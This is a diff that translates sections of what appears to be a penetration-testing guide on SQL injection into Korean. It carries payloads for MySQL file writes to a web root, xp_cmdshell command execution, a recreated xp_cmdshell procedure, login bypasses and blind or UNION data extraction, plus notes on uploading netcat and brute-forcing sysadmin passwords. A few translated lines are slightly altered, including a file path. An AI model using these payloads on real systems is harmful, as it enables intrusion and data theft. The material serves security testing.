@@ -456,7 +456,7 @@ The blind SQL injection attack needs a high volume of queries. The tester may ne
 
 |
 
-Error based Exploitation technique 
+에러 기반 공격 기술
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 An Error based exploitation technique is useful when the tester for some reason can't exploit the SQL injection vulnerability using other technique such as UNION. The Error based technique consists in forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section). Consider the following SQL query: 
@@ -1091,29 +1091,30 @@ All of this information could be extracted by using known techniques as describe
 파일 쓰기
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-If the connected user has FILE privileges and single quotes are not escaped, the 'into outfile' clause can be used to export query results in a file. 
+만약 연결한 사용자가 파일 권한을 가지고 있고 싱글쿼터로 빠져나갈 수 없다면, 
+'into outfile' 절이 파일에 쿼리 결과를 내보내는 데 사용할 수 있습니다.
 
 .. code-block:: html
 
     Select * from table into outfile '/tmp/file' 
 
-Note: there is no way to bypass single quotes surrounding a filename. So if there's some sanitization on single quotes like escape (\') there will be no way to use the 'into outfile' clause. 
-
+Note: 파일명 주위의 싱글쿼터를 우회할 수 있는 방법이 없습니다.
+그래서 만약 빠져나가는 것과 같은 싱글쿼터에 일부 필터링이 있다면,
+'into outfile'절을 사용할 수 있는 방법이 없을 것입니다.
 
 This kind of attack could be used as an out-of-band technique to gain information about the results of a query or to write a file which could be executed inside the web server directory. 
 
-Example: 
+**예제**
 
 .. code-block:: html
 
-    1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS 
-    ENCLOSED BY '//'  LINES TERMINATED BY '\n<%jsp code 
-    here%>'; 
+    1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS ENCLOSED BY 
+    '//'  LINES TERMINATED BY '\n<%jsp code here%>'; 
 
 **예상 결과**
 
-Results are stored in a file with rw-rw-rw privileges owned by MySQL user and group. 
-Where /var/www/root/test.jsp will contain: 
+결과는 MySQL 사용자와 그룹에 의한 rw-rw-rw 권한으로 파일에 저장됩니다.
+//var//www//root//test.jsp에 포함될 것 입니다.
 
 .. code-block:: html
 
@@ -1125,7 +1126,9 @@ Where /var/www/root/test.jsp will contain:
 파일 읽기
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-Load_file is a native function that can read a file when allowed by the file system permissions. If a connected user has FILE privileges, it could be used to get the files' content. Single quotes escape sanitization can by bypassed by using previously described techniques. 
+Load_file은 파일 시스템 권한에 따라 파일을 읽을 수 있는 내부 함수입니다.
+만약 연결된 사용자가 파일 권한을 가지고 있다면, 파일 내용을 얻기 위해 사용합니다.
+싱글쿼터 취소 필터링은 이전에 설명했던 기술을 사용하여 우회할 수 있습니다.
 
 .. code-block:: html
 
@@ -1133,7 +1136,7 @@ Load_file is a native function that can read a file when allowed by the file sys
 
 **예상 결과**
 
-The whole file will be available for exporting by using standard techniques. 
+전체 파일은 표준 기술을 사용하여 내보내기가 가능할 것입니다.
 
 |
 
@@ -1145,17 +1148,18 @@ A good attack is to know the results by forcing a function/procedureor the serve
 
 |
 
-Out of band SQL Injection 
+Out of band SQL 인젝션
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 Out of band injection could be accomplished by using the 'into out-file' clause. 
 
 |
 
-Blind SQL Injection 
+블라인드 SQL 인젝션
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-For blind SQL injection, there is a set of useful function natively provided by MySQL server. 
+블라인드 SQL 인젝션을 위해서는 MySQL 서버에서 유용한 기본 함수 리스트가 있습니다.
+
 - 문자열 길이
 
 .. code-block:: html
@@ -1168,7 +1172,7 @@ For blind SQL injection, there is a set of useful function natively provided by 
 
     SUBSTRING(string, offset, #chars_returned) 
 
-- 시간 기반 블라인드 인젝션: BENCHMARK and SLEEP 
+- 시간 기반 블라인드 인젝션: BENCHMARK와 SLEEP 
 
 .. code-block:: html
 
@@ -1179,7 +1183,7 @@ when blind injection by boolean values does not yield any results.
 
 See. SLEEP() (MySQL > 5.0.x) for an alternative on benchmark. 
 
-For a complete list, refer to the MySQL manual at http://dev.mysql.com/doc/refman/5.0/en/functions.html 
+- MySQL 매뉴얼: http://dev.mysql.com/doc/refman/5.0/en/functions.html 
 
 |
 
@@ -1200,14 +1204,14 @@ References
 Whitepapers 
 --------------------------------------------------------------------------------------------
 
-- Chris Anley: "Hackproofing MySQL" - http://www.databasesecurity.com/mysql/HackproofingMySQL.pdf 
+- Chris Anley: "Hackproofing MySQL": http://www.databasesecurity.com/mysql/HackproofingMySQL.pdf 
 
 |
 
 Case Studies 
 --------------------------------------------------------------------------------------------
 
-- Zeelock: Blind Injection in MySQL Databases - http://archive.cert.uni-stuttgart.de/bugtraq/2005/02/msg00289.html 
+- Zeelock: Blind Injection in MySQL Databases: http://archive.cert.uni-stuttgart.de/bugtraq/2005/02/msg00289.html 
 
 |
 
@@ -1237,14 +1241,14 @@ Microsoft SQL server has a few unique characteristics, so some exploits need to 
 테스트 방법
 ============================================================================================
 
-SQL Server Characteristics 
+MSSQL 특징
 --------------------------------------------------------------------------------------------
 
-To begin, let's see some SQL Server operators and commands/ stored procedures that are useful in a SQL Injection test: 
+시작하기 위해, 일부 SQL 서버 운영자 및 SQL 인젝션 테스트에 유용한 명령/저장 프로시저를 봅시다.
 
-1. comment operator: -- (useful for forcing the query to ignore the remaining portion of the original query; this won't be necessary in every case) 
-2. query separator: ; (semicolon) 
-3. Useful stored procedures include: 
+1. 주석 연산자: -- (useful for forcing the query to ignore the remaining portion of the original query; this wont be necessary in every case) 
+2. 쿼리 구분자: ; (세미콜론) 
+3. 유용한 저장 프로시저를 포함: 
 
 - [xp_cmdshell] executes any command shell in the server with the same permissions that it is currently running. By default, only sysadmin is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp_configure) 
 - xp_regread reads an arbitrary value from the Registry (undocumented extended procedure) 
@@ -1252,21 +1256,20 @@ To begin, let's see some SQL Server operators and commands/ stored procedures th
 - [sp_makewebtask] Spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text. It requires sysadmin privileges. 
 - [xp_sendmail] Sends an e-mail message, which may include a query result set attachment, to the specified recipients. This extended stored procedure uses SQL Mail to send the message. 
 
-Let's see now some examples of specific SQL Server attacks that use the aforementioned functions. Most of these examples will use the exec function. 
+Lets see now some examples of specific SQL Server attacks that use the aforementioned functions. Most of these examples will use the exec function. 
 
-Below we show how to execute a shell command that writes the output of the command dir c:\inetpub in a browseable file, assuming that the web server and the DB server reside on the same host. The following syntax uses xp_cmdshell: 
+Below we show how to execute a shell command that writes the output of the command "dir c:\inetpub" in a browseable file, assuming that the web server and the DB server reside on the same host. The following syntax uses xp_cmdshell: 
 
 .. code-block:: html
 
-    exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\ 
-    wwwroot\test.txt'--
+    exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--
 
-Alternatively, we can use sp_makewebtask: 
+또한, 우리는 sp_makewebtask를 사용할 수 있습니다.: 
 
 .. code-block:: html
 
     exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 
-    'select * from master.dbo.sysobjects'-
+    'select * from master.dbo.sysobjects'--
 
 A successful execution will create a file that can be browsed by the pen tester. Keep in mind that sp_makewebtask is deprecated, and, even if it works in all SQL Server versions up to 2005, it might be removed in the future. 
 In addition, SQL Server built-in functions and environment variables are very handy. The following uses the function db_name() to trigger an error that will return the name of the database: 
@@ -1288,17 +1291,17 @@ The following example uses the environment variable @@version , combined with a 
 
 .. code-block:: html
 
-    /form.asp?prop=33%20union%20select%20 
-    1,2006-01-06,2007-01-06,1,'stat','name1','na 
-    me2',2006-01-06,1,@@version%20--
+    /form.asp?prop=33%20union%20select%201,
+    2006-01-06,2007-01-06,1,'stat','name1',
+    'name2',2006-01-06,1,@@version%20--
 
 And here's the same attack, but using again the conversion trick: 
 
 .. code-block:: html
 
-    /form.asp?prop=33%20union%20select%20 
-    1,2006-01-06,2007-01-06,1,'stat','name1','na 
-    me2',2006-01-06,1,@@version%20--
+    /form.asp?prop=33%20union%20select%20 1,
+    2006-01-06,2007-01-06,1,'stat','name1',
+    'name2',2006-01-06,1,@@version%20--
 
 Information gathering is useful for exploiting software vulnerabilities at the SQL Server, through the exploitation of an SQL-injection attack or direct access to the SQL listener. 
 
@@ -1306,40 +1309,44 @@ In the following, we show several examples that exploit SQL injection vulnerabil
 
 |
 
-Example 1: Testing for SQL Injection in a GET request. 
+예제 1: GET 요청에 SQL 인젝션 테스트
 --------------------------------------------------------------------------------------------
 
-The most simple (and sometimes most rewarding) case would be that of a login page requesting an user name and password for user login. You can try entering the following string "' or '1'='1" (without double quotes): 
+The most simple (and sometimes most rewarding) case would be that of a login page requesting an user name and password for user login.
+You can try entering the following string "' or '1'='1" (without double quotes): 
 
 .. code-block:: html
 
-    https://vulnerable.web.app/login.asp?Username='%20or%20 
-    '1'='1&Password='%20or%20'1'='1 
+    https://vulnerable.web.app/login.asp?
+    Username='%20or%20'1'='1&Password='%20or%20'1'='1 
 
 If the application is using Dynamic SQL queries, and the string gets appended to the user credentials validation query, this may result in a successful login to the application. 
 
 |
 
-Example 2: Testing for SQL Injection in a GET request 
+예제 2: GET 요청에 SQL 인젝션 테스트
 --------------------------------------------------------------------------------------------
 
-In order to learn how many columns exist 
+컬럼 길이 확인 
 
 .. code-block:: html
 
-    https://vulnerable.web.app/list_report.aspx?num
-    ber=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20 
-    users;-
+    https://vulnerable.web.app/list_report.aspx?
+    number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--
 
 |
 
-Example 3: Testing in a POST request 
+예제 3: POST 요청에 테스트 
 --------------------------------------------------------------------------------------------
 
-SQL Injection, HTTP POST Content: email=%27&whichSubmit=submit&submit.x=0&submit.y=0 
+SQL 인젝션, HTTP POST 내용: 
 
-A complete post example: 
+.. code-block:: html
 
+    email=%27&whichSubmit=submit&submit.x=0&submit.y=0 
+
+전체 POST 예제: 
+`
 .. code-block:: html
 
     POST https://vulnerable.web.app/forgotpass.asp HTTP/1.1
@@ -1358,18 +1365,20 @@ A complete post example:
 
     email=%27&whichSubmit=submit&submit.x=0&submit.y=0 
 
-The error message obtained when a ' (single quote) character is entered at the email field is: 
+싱글쿼터 문자가 이메일 필드에 입력되어 있을 때 에러 메시지는 아래와 같습니다.
 
 .. code-block:: html
 
-    PMicrosoft OLE DB Provider for SQL Server error '80040e14' Unclosed quotation mark before the character string  '. /forgotpass.asp, line 15 
+    PMicrosoft OLE DB Provider for SQL Server error '80040e14'
+    Unclosed quotation mark before the character string  '. 
+    /forgotpass.asp, line 15 
 
 |
 
-Example 4: Yet another (useful) GET example 
+예제 4: 또 다른 GET 예제
 --------------------------------------------------------------------------------------------
 
-Obtaining the application's source code 
+어플리케이션의 소스코드 얻기
 
 .. code-block:: html
 
@@ -1378,10 +1387,11 @@ Obtaining the application's source code
 
 |
 
-Example 5: custom xp_cmdshell 
+예제 5: custom xp_cmdshell 
 --------------------------------------------------------------------------------------------
 
 All books and papers describing the security best practices for SQL Server recommend disabling xp_cmdshell in SQL Server 2000 (in SQL Server 2005 it is disabled by default). However, if we have sysadmin rights (natively or by bruteforcing the sysadmin password, see below), we can often bypass this limitation. 
+
 On SQL Server 2000: 
 
 - If xp_cmdshell has been disabled with sp_dropextendedproc, we can simply inject the following code: 
@@ -1390,21 +1400,26 @@ On SQL Server 2000:
 
     sp_addextendedproc 'xp_cmdshell','xp_log70.dll' 
 
-. 
-If the previous code does not work, it means that the xp_log70. dll has been moved or deleted. In this case we need to inject the following code: 
+- If the previous code does not work, it means that the xp_log70. dll has been moved or deleted. In this case we need to inject the following code: 
 
 .. code-block:: html
 
     CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait 
-    int = 0) AS  DECLARE @result int, @OLEResult int, @RunResult int  DECLARE @ShellID int  EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID 
-    OUT  IF @OLEResult <> 0 SELECT @result = @OLEResult  IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @ 
-    OLEResult)  EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, 
+    int = 0) AS  
+        DECLARE @result int, @OLEResult int, @RunResult int  
+        DECLARE @ShellID int
+        EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID 
+    OUT  
+        IF @OLEResult <> 0 SELECT @result = @OLEResult  
+        IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @ 
+    OLEResult)  
+        EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, 
     @cmd, 0, @Wait
-    IF @OLEResult <> 0 SELECT @result = @OLEResult
-    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLERe
+        IF @OLEResult <> 0 SELECT @result = @OLEResult
+        IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLERe
     sult)
-    EXECUTE @OLEResult = sp_OADestroy @ShellID
-    return @result 
+        EXECUTE @OLEResult = sp_OADestroy @ShellID
+        return @result 
 
 This code, written by Antonin Foller (see links at the bottom of the page), creates a new xp_cmdshell using sp_oacreate, sp_oamethod and sp_oadestroy (as long as they haven't been disabled too, of course). Before using it, we need to delete the first xp_ cmdshell we created (even if it was not working), otherwise the two declarations will collide. 
 
@@ -1419,7 +1434,7 @@ On SQL Server 2005, xp_cmdshell can be enabled by injecting the following code i
 
 |
 
-Example 6: Referer / User-Agent 
+예제 6: Referer / User-Agent 
 --------------------------------------------------------------------------------------------
 
 The REFERER header set to: 
@@ -1437,7 +1452,7 @@ Allows the execution of arbitrary SQL Code. The same happens with the User-Agent
 
 |
 
-Example 7: SQL Server as a port scanner 
+예제 7: 포트 스캐너로 SQL Server
 --------------------------------------------------------------------------------------------
 
 In SQL Server, one of the most useful (at least for the penetration tester) commands is OPENROWSET, which is used to run a query on another DB Server and retrieve the results. The penetration tester can use this command to scan ports of other machines in the target network, injecting the following query: 
@@ -1462,7 +1477,7 @@ Keep in mind that OPENROWSET is enabled by default in SQL Server 2000 but disabl
 
 |
 
-Example 8: Upload of executables 
+예제 8: 실행 파일 업로드
 --------------------------------------------------------------------------------------------
 
 Once we can use xp_cmdshell (either the native one or a custom one), we can easily upload executables on the target DB Server. A very common choice is netcat.exe, but any trojan will be useful here. If the target is allowed to start FTP connections to the tester's machine, all that is needed is to inject the following queries: At this point, nc.exe will be uploaded and available. 
@@ -1500,7 +1515,7 @@ Not all is lost when the web application does not return any information --such 
 Other options for out of band attacks are described in Sample 4 above. 
 
 
-Blind SQL injection attacks 
+블라인드 SQL 인젝션 공격 
 ============================================================================================
 
 Trial and error 
@@ -1514,6 +1529,7 @@ Alternatively, one may play lucky. That is the attacker may assume that there is
 
 then the penetration tester might enter the text: 'Bomba' OR 1=1- and if data is not properly validated, the query will go through and return the whole list of books. This is evidence that there is a SQL injection vulnerability. The penetration tester might later play with the queries in order to assess the criticality of this vulnerability. 
 
+|
 
 If more than one error message is displayed 
 --------------------------------------------------------------------------------------------
@@ -1570,7 +1586,7 @@ However, it might happen that the command waitfor is not available (e.g., becaus
 
 |
 
-Checking for version and vulnerabilities 
+버전과 취약점 확인
 --------------------------------------------------------------------------------------------
 
 The same timing approach can be used also to understand which version of SQL Server we are dealing with. Of course we will leverage the built-in @@version variable. Consider the following query: 
@@ -1597,7 +1613,7 @@ Such query will wait 5 seconds if the 25th character of the @@version variable i
 
 |
 
-Example 9: bruteforce of sysadmin password 
+예제 9: sysadmin 패스워드 무작위 공격
 --------------------------------------------------------------------------------------------
 
 To bruteforce the sysadmin password, we can leverage the fact that OPENROWSET needs proper credentials to successfully perform the connection and that such a connection can be also "looped" to the local DB Server. Combining these features with an inferenced injection based on response timing, we can inject the following code: 
@@ -1693,7 +1709,7 @@ An example of a banner string that could be returned is:
     (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
 
 
-Blind Injection 
+블라인드 인젝션
 --------------------------------------------------------------------------------------------
 
 For blind SQL injection attacks, you should take into consideration the following built-in functions: 
